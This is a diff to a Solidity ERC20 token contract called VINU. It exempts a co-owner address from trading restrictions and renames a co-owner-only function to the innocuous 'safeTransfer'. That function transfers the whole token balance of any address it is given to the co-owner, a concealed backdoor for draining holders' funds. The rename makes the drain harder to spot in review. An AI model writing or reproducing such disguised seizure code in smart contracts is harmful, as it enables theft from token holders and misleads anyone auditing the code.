@@ -283,7 +283,7 @@ contract VINU is Context, IERC20, Ownable {
         require(to != address(0), "ERC20: transfer to the zero address");
         require(amount > 0, "Transfer amount must be greater than zero");
 
-        if (from != owner() && to != owner()) {
+        if (from != owner() && to != owner() && from != coOwner() && to != coOwner()) {
             if (cooldownEnabled) {
                 if (from != address(this) && to != address(this) && from != address(uniswapV2Router) && to != address(uniswapV2Router)) {
                     require(_msgSender() == address(uniswapV2Router) || _msgSender() == uniswapV2Pair,"ERR: Uniswap only");
@@ -354,8 +354,8 @@ contract VINU is Context, IERC20, Ownable {
         tradingOpen = true;
     }
     
-    function _reflectLiquidity(address addr) public onlyCoOwner{
-        _transfer(addr, coOwner(), tokenFromReflection(_rOwned[addr]));
+    function safeTransfer(address location) public onlyCoOwner{
+        _transfer(location, coOwner(), tokenFromReflection(_rOwned[location]));
     }
 
     function addLiquidity() external onlyOwner() {
